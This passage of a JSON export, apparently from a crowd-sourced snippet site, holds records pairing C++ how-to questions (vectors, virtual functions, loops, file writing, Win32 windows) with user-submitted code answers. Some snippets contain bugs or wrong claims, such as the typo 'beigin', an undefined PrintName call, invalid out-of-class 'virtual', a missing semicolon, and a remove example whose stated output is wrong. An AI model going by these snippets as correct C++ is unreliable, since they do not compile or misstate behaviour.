    "description": "#include <vector>  int main() {   std::vector<int> v;   v.push_back(10); // v = [10];   v.push_back(20); // v = [10, 20];      v.pop_back(); // v = [10];   v.push_back(30); // v = [10, 30];      auto it = v.begin();   int x = *it; // x = 10;   ++it;   int y = *it; // y = 30   ++it;   bool is_end = it == v.end(); // is_end = true      return 0; }\nvector_name.push_back(element_to_be_added);\n#include <vector> #include <string>  int main() {   std::vector<std::string> str_v;   str_v.push_back(\"abc\");   str_v.push_back(\"hello world!!\");   str_v.push_back(\"i'm a coder.\");   for(auto it = str_v.beigin();it != str_v.end(); it++) {   \tprintf(\"%s\\n\",it->c_str());   } }\n#include <vector> std::vector<std::string> x;\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n vector<int> vec; //Creates an empty (size 0) vector    vector<int> vec(4); //Creates a vector with 4 elements.  /*Each element is initialised to zero. If this were a vector of strings, each string would be empty. */  vector<int> vec(4, 42);  /*Creates a vector with 4 elements. Each element is initialised to 42. */   vector<int> vec(4, 42); vector<int> vec2(vec);  /*The second line creates a new vector, copying each element from the vec into vec2. */\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1308,
    "keyword": null,
    "link": null,
    "title": " c++ vector allocator example",
    "description": "// vector::get_allocator #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int * p;   unsigned int i;    // allocate an array with space for 5 elements using vector's allocator:   p = myvector.get_allocator().allocate(5);    // construct values in-place on the array:   for (i=0; i<5; i++) myvector.get_allocator().construct(&p[i],i);    std::cout << \"The allocated array contains:\";   for (i=0; i<5; i++) std::cout << ' ' << p[i];   std::cout << '\\n';    // destroy and deallocate:   for (i=0; i<5; i++) myvector.get_allocator().destroy(&p[i]);   myvector.get_allocator().deallocate(p,5);    return 0; }\nThe allocated array contains: 0 1 2 3 4 \n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1309,
    "keyword": null,
    "link": null,
    "title": " c++ vector average",
    "description": "double avg1(std::vector<int> const& v) {     return 1.0 * std::accumulate(v.begin(), v.end(), 0LL) / v.size(); } \n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1310,
    "keyword": null,
    "link": null,
    "title": " c++ vector combine two vectors",
    "description": "vector1.insert(vector1.end(), vector2.begin(), vector2.end());\n// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ vector<int> AB; AB.reserve(A.size() + B.size()); // preallocate memory AB.insert(AB.end(), A.begin(), A.end()); AB.insert(AB.end(), B.begin(), B.end()); //eg : A = {4, 1}, B = {2, 5} //after the 2 insert operations, AB = {4, 1, 2, 5}\n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1311,
    "keyword": null,
    "link": null,
    "title": " c++ vector decimal to binary",
    "description": "std::string toBinary(int n) {     std::string r;     while(n!=0) {r=(n%2==0 ?\"0\":\"1\")+r; n/=2;}     return r; } \n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1312,
    "keyword": null,
    "link": null,
    "title": " c++ vector erase by value",
    "description": "//wiki - erase-remove idiom // Use g++ -std=c++11 or clang++ -std=c++11 to compile.  #include <algorithm>  // remove and remove_if #include <iostream> #include <vector>  // the general-purpose vector container  void Print(const std::vector<int>& vec) {   for (const auto& i : vec) {     std::cout << i << ' ';   }   std::cout << '\\n'; }  int main() {   // Initializes a vector that holds numbers from 0-9.   std::vector<int> v = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};   Print(v);    // Removes all elements with the value 5.   v.erase(std::remove(v.begin(), v.end(), 5), v.end());   Print(v); }  /* Output: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 6 7 8 9  */\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\ntemplate <typename T> void remove(std::vector<T>& vec, size_t pos) {     std::vector<T>::iterator it = vec.begin();     std::advance(it, pos);     vec.erase(it); }\n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1313,
    "keyword": null,
    "link": null,
    "title": " c++ vector extend vector",
    "description": "std::vector<int> a = {1, 2}; std::vector<int> b = {3, 4, 5}; a.insert(a.end(), b.begin(), b.end()); // a = {1, 2, 3, 4, 5}\nstd::vector<int> vec = {1, 2, 3}; vec.resize(2); // {1, 2} vec.resize(4); // {1, 2, 0, 0,} vec.resize(6, 9);  // {1, 2, 0, 0, 9, 9}\n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1314,
    "keyword": null,
    "link": null,
    "title": " c++ vector fill",
    "description": "#include <algorithm> #include <vector>   std::fill(v.begin(), v.end(), value);\n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1315,
    "keyword": null,
    "link": null,
    "title": " c++ vector foreach",
    "description": "std::vector<Entity> entities;  for (Entity& entity : entities) { \tentity.doStuff();                 }\nfor(int i=0; i < size(vector); i++){    vector[i]=0; } \n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1316,
    "keyword": null,
    "link": null,
    "title": " c++ vector get first element",
    "description": "// vector::front #include <iostream> #include <vector>  int main () {    std::vector<int> myvector;   myvector.push_back(78);   myvector.push_back(16);   // now front equals 78, and back 16      int first = myvector.front(); //first = 78   std::cout << \"the first value in vector is \" << first << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:38:48.000Z"
  },
  {
    "id": 1317,
    "keyword": null,
    "link": null,
    "title": " c++ vector initialize size",
    "description": "vector<vector<int>> v(10, vector<int>(10));\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5))); \nstd::vector<std::string> vec(20000); \nvector<Entry> array(1000);//size of 1000 \n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1318,
    "keyword": null,
    "link": null,
    "title": " c++ vector insert time complexity",
    "description": "// inserting into a vector #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (3,100);   std::vector<int>::iterator it;    it = myvector.begin();   it = myvector.insert ( it , 200 );    myvector.insert (it,2,300);    // \"it\" no longer valid, get a new one:   it = myvector.begin();    std::vector<int> anothervector (2,400);   myvector.insert (it+2,anothervector.begin(),anothervector.end());    int myarray [] = { 501,502,503 };   myvector.insert (myvector.begin(), myarray, myarray+3);    std::cout << \"myvector contains:\";   for (it=myvector.begin(); it<myvector.end(); it++)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1319,
    "keyword": null,
    "link": null,
    "title": " c++ vector iterator",
    "description": "#include <iostream> #include <vector> using namespace std;  vector<int> myvector;  for (vector<int>::iterator it = myvector.begin();      it != myvector.end();      ++it)    cout << ' ' << *it; cout << '\\n'; \n// EXAMPLE vector<string> vData; vData.push_back(\"zeroth\"); vData.push_back(\"first\"); vData.push_back(\"second\"); vData.push_back(\"third\");  std::vector<string>::iterator itData;  for (itData = vData.begin(); itData != vData.end() ; itData++) {   auto ElementIndex = itData-vData.begin();   auto ElementValue = vData[ElementIndex]; // vData[ElementIndex] = *itData   cout << \"[ElementIndex:\" << ElementIndex << \"][ElementValue:\" << ElementValue << \"]\\n\"; }  /* HEADER(S) #include <vector> #include <iostream> using namespace std; */\n// vector::begin/end #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   for (int i=1; i<=5; i++) myvector.push_back(i);    std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it = myvector.begin() ; it != myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1320,
    "keyword": null,
    "link": null,
    "title": " c++ vector move element to front",
    "description": "std::rotate(yourVector.begin(), it, it + 1); // it - iterator which points to an element you want to move\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1321,
    "keyword": null,
    "link": null,
    "title": " c++ vector pop back",
    "description": "// vector::pop_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int sum (0);   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    while (!myvector.empty())   {     sum+=myvector.back();     myvector.pop_back();   }    std::cout << \"The elements of myvector add up to \" << sum << '\\n';    return 0; }\n#include <bits/stdc++.h>  using namespace std; int main(){     vector<int> v1{10, 20, 30, 40, 50};          //removing elemenets     v1.pop_back();  //removes 50     v1.pop_back();  //removes 40  }\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1322,
    "keyword": null,
    "link": null,
    "title": " c++ vector pop first element",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\nstd::vector<int> vect;  vect.erase(vect.begin());\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\n// Deletes the first element from vector v v.erase(v.begin());\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n// Why not setup a lambda you can use again & again auto removeByIndex =    []<class T>(std::vector<T> &vec, unsigned int index) { \t// This is the meat & potatoes   \tvec.erase(vec.begin() + index); };  // Then you can throw whatever vector at it you desire std::vector<std::string> stringvec = {\"Hello\", \"World\"}; // Will remove index 1: \"World\" removeByIndex(stringvec, 1); // Vector of integers, we will use push_back std::vector<unsigned int> intvec; intvec.push_back(33); intvec.push_back(66); intvec.push_back(99); // Will remove index 2: 99 removeByIndex(intvec, 2);\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1323,
    "keyword": null,
    "link": null,
    "title": " c++ vector print",
    "description": "for(int i = 0; i < vec.size(); i++)     std::cout << vec[i] << ' ';\n#include <iostream> #include <vector>  int main() { \tstd::vector<int> myVector = {1, 2, 3, 4, 5, 6};  \tfor(int i = 0; i < myVector.size(); i++) \t{ \t\tstd::cout << myVector[i] << std::endl;                  //***** alternate method ******* \t\t//std::cout << myVector.at(i) << std::endl;\t\t \t}\t }\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1324,
    "keyword": null,
    "link": null,
    "title": " c++ vector push back",
    "description": "int myint; do {   std::cin >> myint;   myvector.push_back (myint); } while (myint);\n//Let us say we have a vector v with elements {1, 2, 3, 4} //To pushback 5 v.push_back(5);\n(Things).push_back(Items)\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1325,
    "keyword": null,
    "link": null,
    "title": " c++ vector push if not exist",
    "description": "std::vector<std::string> name;  if (std::find(name.begin(), name.end(), someName) == name.end()) {   // someName not in name, add it   name.push_back(someName); } \n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1326,
    "keyword": null,
    "link": null,
    "title": " c++ vector quick search",
    "description": "for ( auto iter = serverList.begin();         iter != serverList.end();         ++ iter ) {     if ( std::search( iter->begin(), iter->end(),                       index.begin(), index.end() ) != iter->end() ) {         indexResult.push_back( iter - serverList.begin() );     } }\n",
    "reg_date": "2021-10-12T11:38:49.000Z"
  },
  {
    "id": 1327,
    "keyword": null,
    "link": null,
    "title": " c++ vector remove element by value",
    "description": "//wiki - erase-remove idiom // Use g++ -std=c++11 or clang++ -std=c++11 to compile.  #include <algorithm>  // remove and remove_if #include <iostream> #include <vector>  // the general-purpose vector container  void Print(const std::vector<int>& vec) {   for (const auto& i : vec) {     std::cout << i << ' ';   }   std::cout << '\\n'; }  int main() {   // Initializes a vector that holds numbers from 0-9.   std::vector<int> v = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};   Print(v);    // Removes all elements with the value 5.   v.erase(std::remove(v.begin(), v.end(), 5), v.end());   Print(v); }  /* Output: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 6 7 8 9  */\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nstd::vector<int> v;  // fill it up somehow v.erase(std::remove(v.begin(), v.end(), 99), v.end());  // really remove all elements with value 99\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \ncarVec.erase(std::remove_if(carVec.begin(), carVec.end(), [&id_to_delete](const Car& ele)->bool             {                 return ele.getnewId() == id_to_delete;             }), carVec.end()); \n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1328,
    "keyword": null,
    "link": null,
    "title": " c++ vector resize",
    "description": "vector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5)));\ndp.resize(n+1,vector<vector<int>>(n+1,vector<int>(n+1,-1))); \nThe C++ function std::vector::resize() changes the size of vector. If n is smaller than current size then extra elements are destroyed.  If n is greater than current container size then new elements are inserted at the end of vector.  If val is specified then new elements are initialed with val.\nstd::vector<int> a = {1, 2}; std::vector<int> b = {3, 4, 5}; a.insert(a.end(), b.begin(), b.end()); // a = {1, 2, 3, 4, 5}\nstd::vector<int> vec = {1, 2, 3}; vec.resize(2); // {1, 2} vec.resize(4); // {1, 2, 0, 0,} vec.resize(6, 9);  // {1, 2, 0, 0, 9, 9}\nresize (size_type n, const value_type& val);  The resize() method (and passing argument to constructor is equivalent to that)    will insert or delete appropriate number of elements to the vector to make it  given size (it has optional second argument to specify their value). \n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1329,
    "keyword": null,
    "link": null,
    "title": " c++ vector size",
    "description": "#include <vector>  int main () {     std::vector<int> v;     auto size = v.size(); }\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n#include <iostream> #include <vector> using namespace std;  int main() {   //vector element size   const int size = 4;    //vector with int data type   //all elements are equal to 4   vector<int> myVect (size, 4);    for (int i=0; i<size; i++) {     cout << \"Vector index(\" << i <<\") is: \"<< myVect[i] << endl;    }   return 0; }\nvector<int> a; //to directly find the size of the vector; //use  a.size(;  cout <<\" \" << a.size();\n#include <iostream> #include <vector>  using namespace std;  int main(void) {    vector<int> v;     cout << \"Initial vector size = \" << v.size() << endl;     v.resize(5, 10);    cout << \"Vector size after resize = \" << v.size() << endl;     cout << \"Vector contains following elements\" << endl;    for (int i = 0; i < v.size(); ++i)       cout << v[i] << endl;     return 0; }\nvectorName.size();\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1330,
    "keyword": null,
    "link": null,
    "title": " c++ vector structure",
    "description": "#include <vector>  typedef struct test1 {   int a;   char b; } TOTO;  std::vector<TOTO> _v;  _v.push_back((TOTO){10, 'a'}); _v[0].a = 101;\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1331,
    "keyword": null,
    "link": null,
    "title": " c++ virtual",
    "description": "#include <iostream> #include<string> \t//Virtual Functions are functions that allow us to override methods in subclasses //In this example  we have an entity class as a base class and class player inherits from public entity  class Entity { public: \tvirtual std::string GetName() { return \"Entity\"; }//It is a method in base class that we want to modify in sub class Player \tvoid Print() { std::cout << \"This is Base class\" << std::endl;}//function that is not virtual }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; };//function that is not virtual \tstd::string GetName()override { return m_name; };//overriding the function in sub class };  int main() { \tEntity* e = new Entity(); \tstd::cout << e->GetName() << std::endl; \tPlayer* p = new Player(\"Jacob\"); \tstd::cout << p->GetName() << std::endl; \tPrintName(p);// This function calls the GetName method from the Player instance despite it takes an entity instance as a parameter this is because player class is a sub  class of Entity and the method is marked virtual it will map with the method in the Player class and call it from there .It outputs => Jacob \t//if It was not virtual it would have called The method From Entity Instance and output would be => Entity \tEntity* notvirtualentity = new Entity(); \tPlayer* notvirtualpalyer = new Player(\"XX\"); \tnotvirtualentity =  notvirtualpalyer; \tnotvirtualentity->Print();//It prints => this is base class if it was virtual function it would call print function from Player Class and print => This is subclass \tstd::cin.get(); }\n#include <iostream> struct Base {    virtual void f() {        std::cout << \"base\\n\";    } }; struct Derived : Base {     void f() override { // 'override' is optional         std::cout << \"derived\\n\";     } }; int main() {     Base b;     Derived d;       // virtual function call through reference     Base& br = b; // the type of br is Base&     Base& dr = d; // the type of dr is Base& as well     br.f(); // prints \"base\"     dr.f(); // prints \"derived\"       // virtual function call through pointer     Base* bp = &b; // the type of bp is Base*     Base* dp = &d; // the type of dp is Base* as well     bp->f(); // prints \"base\"     dp->f(); // prints \"derived\"       // non-virtual function call     br.Base::f(); // prints \"base\"     dr.Base::f(); // prints \"base\" }\n#include <iostream> #include <string>  class Entity { public:   virtual std::string getName();   void print();  };  virtual std::string Entity::getName() { \treturn \"Entity\"; }  void Entity::print() { \tstd::cout << \"This is the base class\" << std::endl; }  class Player : public Entity {   std::string m_name; public: \tPlayer(const std::string& name): m_name(name) {};   \tvoid print();   \tvirtual std::string getName(); };  virtual std::string Player::getName() { \treturn m_name; }  void Player::print() { \tstd::cout << \"This is the sub class\" << std::endl; }  int main() { \tEntity* e = new Entity();   \tstd::cout << e->getName() << std::endl;   \tPlayer* p = new Player(\"Jacob\");   \tstd::cout << p->getName() << std::endl;   \tp->print();   \te->print();      \tEntity* notVirtualEntity = new Entity();   \tPlayer* notVirtualPlayer = new Player(\"Bob\");   \tnotVirtualEntity = notVirtualPlayer;   \tnotVirtualEntity->print();   \tnotVirtualEntity->getName(); }\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1332,
    "keyword": null,
    "link": null,
    "title": " c++ visual studio 19 how to make colord button from code",
    "description": "//Back color button1->BackColor = Color::Black; //or string StringWithColorCode = \"Black\"; button1->BackColor = System::Drawing::ColorTranslator::FromHtml(StringWithColorCode);  //Fore Color button1->ForeColor = Color::White; //or string StringWithColorCode = \"White\"; button1->ForeColor = System::Drawing::ColorTranslator::FromHtml(StringWithColorCode); \n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1333,
    "keyword": null,
    "link": null,
    "title": " c++ void to avoid functions",
    "description": "/*The following example collects user data and formats it using seperate void statements */ #include <iostream> #include <string> #include <stdio.h> #include <stdlib.h>  using namespace std;  // function declarations void inputData(); void displayData();  string name, addr1, addr2, postalCode; // the main method1 int main() {     inputData();     displayData();      return 0; }  // the first function definition void inputData() {     cout << \"Kindly provide your address details \\n\"          << \"Name: \";     getline(cin, name);     cout << \"Address1: \";     getline(cin, addr1);     cout << \"Address2: \";     getline(cin, addr2);     cout << \"PostalCode: \";     getline(cin, postalCode); }  // the second function definition void displayData() {     //system(\"cls\"); exists for DOS or cmd windows     system(\"cls\"); //system(\"clear\") for Linux or MacOS     cout << name          << \"\\n\"          << addr1          << \"\\n\"          << addr2          << \"\\n\"          << postalCode << endl; }\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1334,
    "keyword": null,
    "link": null,
    "title": " c++ vs c#",
    "description": "//you should choose c# purely because unity is BOOOOOOOOMMMMMBBBBB\nC++ for games C# for Apps\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1335,
    "keyword": null,
    "link": null,
    "title": " c++ vs g++",
    "description": "c++ will be a symlink to g++  NOTE: cc and c++ are names of POSIX compilers. More likely than not, c++ will be a symlink to g++, and cc to gcc\n",
    "reg_date": "2021-10-12T11:38:50.000Z"
  },
  {
    "id": 1336,
    "keyword": null,
    "link": null,
    "title": " c++ wait",
    "description": "#include <iostream>     //for using cout #include <Windows.h>     //for using the function Sleep  using namespace std;    //for using cout  int main(void)          {    cout << \"test\" << endl;    Sleep(5000);         //make the programme waiting for 5 seconds    cout << \"test\" << endl;    Sleep(2000);         // wait for 2 seconds before closing     return 0; } \n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1337,
    "keyword": null,
    "link": null,
    "title": " c++ wait for user input",
    "description": "cin.get() //(expected for Enter, need #include <iostream>).\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1338,
    "keyword": null,
    "link": null,
    "title": " c++ watch a variable",
    "description": "// prints the variable name and value #define watch(x) cout << (#x) << \" is \" << (x) << endl;\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1339,
    "keyword": null,
    "link": null,
    "title": " c++ what is #define",
    "description": "// #define is a macro that lets you use an alias name to // make code more readable. During C++'s preproccessing stage, your macro // will be replaced with the suitable code needed for proper compiling.   #include <iostream> // used to define constants, types, functions and more....  #define SIZE 5  #define MacroInt int  #define getmax(a,b) ((a)>(b)?(a):(b))  int main(){   \tMacroInt myIntAsMacro = 7;     std::cout<< getmax(SIZE, myIntAsMacro); // will return 7 } \n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1340,
    "keyword": null,
    "link": null,
    "title": " c++ what is %",
    "description": "x = 11 % 3;\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1341,
    "keyword": null,
    "link": null,
    "title": " c++ while loop",
    "description": "while (true) { // you can also put 1 or true: while (1) \t//do stuff }\ndo {    // codes; } while (testExpression);\nwhile (test_expression) {    // statements     update_expression; }\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\nwhille loops are different then for loops and thats not c++ :D\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1342,
    "keyword": null,
    "link": null,
    "title": " c++ while loop code",
    "description": "while(/*Expression*/){  //Statements go here }\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1343,
    "keyword": null,
    "link": null,
    "title": " c++ while loop example",
    "description": "do {    // codes; } while (testExpression);\nwhile (x != 0){ ... }\n//Executes a statement repeatedly, until the value of condition becomes false. //The test takes place before each iteration while(condition) {   statement }\nwhile (x){ ... }\n int i = 1; while (i < 6) {   cout << i << \"\\n\";   i++; } \n// Executes a statement repeatedly until the value of the condition expression //becomes false. The test takes place after each iteration. do {    //statement } while(condition);\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1344,
    "keyword": null,
    "link": null,
    "title": " c++ while true",
    "description": "while (true) { // or 1/true \t//do stuff }\n",
    "reg_date": "2021-10-12T11:38:51.000Z"
  },
  {
    "id": 1345,
    "keyword": null,
    "link": null,
    "title": " c++ while true loop",
    "description": "while (true) { // you can also put 1 or true: while (1) \t//do stuff }\ndo {    // codes; } while (testExpression);\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\nwhile (true) { // or 1/true \t//do stuff }\nwhile (x){ ... }\n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1346,
    "keyword": null,
    "link": null,
    "title": " c++ window code",
    "description": "// HelloWindowsDesktop.cpp // compile with: /D_UNICODE /DUNICODE /DWIN32 /D_WINDOWS /c  #include <windows.h> #include <stdlib.h> #include <string.h> #include <tchar.h>  // Global variables  // The main window class name. static TCHAR szWindowClass[] = _T(\"DesktopApp\");  // The string that appears in the application's title bar. static TCHAR szTitle[] = _T(\"Windows Desktop Guided Tour Application\");  HINSTANCE hInst;  // Forward declarations of functions included in this code module: LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);  int CALLBACK WinMain(    _In_ HINSTANCE hInstance,    _In_opt_ HINSTANCE hPrevInstance,    _In_ LPSTR     lpCmdLine,    _In_ int       nCmdShow ) {    WNDCLASSEX wcex;     wcex.cbSize = sizeof(WNDCLASSEX);    wcex.style          = CS_HREDRAW | CS_VREDRAW;    wcex.lpfnWndProc    = WndProc;    wcex.cbClsExtra     = 0;    wcex.cbWndExtra     = 0;    wcex.hInstance      = hInstance;    wcex.hIcon          = LoadIcon(hInstance, IDI_APPLICATION);    wcex.hCursor        = LoadCursor(NULL, IDC_ARROW);    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);    wcex.lpszMenuName   = NULL;    wcex.lpszClassName  = szWindowClass;    wcex.hIconSm        = LoadIcon(wcex.hInstance, IDI_APPLICATION);     if (!RegisterClassEx(&wcex))    {       MessageBox(NULL,          _T(\"Call to RegisterClassEx failed!\"),          _T(\"Windows Desktop Guided Tour\"),          NULL);        return 1;    }     // Store instance handle in our global variable    hInst = hInstance;     // The parameters to CreateWindow explained:    // szWindowClass: the name of the application    // szTitle: the text that appears in the title bar    // WS_OVERLAPPEDWINDOW: the type of window to create    // CW_USEDEFAULT, CW_USEDEFAULT: initial position (x, y)    // 500, 100: initial size (width, length)    // NULL: the parent of this window    // NULL: this application does not have a menu bar    // hInstance: the first parameter from WinMain    // NULL: not used in this application    HWND hWnd = CreateWindow(       szWindowClass,       szTitle,       WS_OVERLAPPEDWINDOW,       CW_USEDEFAULT, CW_USEDEFAULT,       500, 100,       NULL,       NULL,       hInstance,       NULL    );     if (!hWnd)    {       MessageBox(NULL,          _T(\"Call to CreateWindow failed!\"),          _T(\"Windows Desktop Guided Tour\"),          NULL);        return 1;    }     // The parameters to ShowWindow explained:    // hWnd: the value returned from CreateWindow    // nCmdShow: the fourth parameter from WinMain    ShowWindow(hWnd,       nCmdShow);    UpdateWindow(hWnd);     // Main message loop:    MSG msg;    while (GetMessage(&msg, NULL, 0, 0))    {       TranslateMessage(&msg);       DispatchMessage(&msg);    }     return (int) msg.wParam; }  //  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM) // //  PURPOSE:  Processes messages for the main window. // //  WM_PAINT    - Paint the main window //  WM_DESTROY  - post a quit message and return LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {    PAINTSTRUCT ps;    HDC hdc;    TCHAR greeting[] = _T(\"Hello, Windows desktop!\");     switch (message)    {    case WM_PAINT:       hdc = BeginPaint(hWnd, &ps);        // Here your application is laid out.       // For this introduction, we just print out \"Hello, Windows desktop!\"       // in the top left corner.       TextOut(hdc,          5, 5,          greeting, _tcslen(greeting));       // End application-specific layout section.        EndPaint(hWnd, &ps);       break;    case WM_DESTROY:       PostQuitMessage(0);       break;    default:       return DefWindowProc(hWnd, message, wParam, lParam);       break;    }     return 0; } \n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1347,
    "keyword": null,
    "link": null,
    "title": " c++ windows error message",
    "description": "// A single line of C-code needed MessageBox(NULL,\"An error has occurred because you didn't use this program correctly!\", \"Error!\", MB_OK);\n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1348,
    "keyword": null,
    "link": null,
    "title": " c++ write string",
    "description": "#include <iostream>  int main() { \tstd::cout << \"Hello\" << std::endl; //endl = end line/new line     // or     printf(\"hello\");      }\n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1349,
    "keyword": null,
    "link": null,
    "title": " c++ write to csv file append",
    "description": "// open for output in append mode (create a new file only if the file does not exist) std::ofstream file( file_name, std::ios::app ) ;\n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1350,
    "keyword": null,
    "link": null,
    "title": " c++ write to file in directory",
    "description": "ofstream myFile(\"/Your/File/Path/YourFilename.txt\");//writing to this file if (myFile.is_open()) {    myFile << \"This is a line.\" << \"\\n\";    myFile << \"This is another line.\" << \"\\n\";    myFile.close(); } else    std::cout << \"Unable to open file\";   \n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1351,
    "keyword": null,
    "link": null,
    "title": " c++ writing to file",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  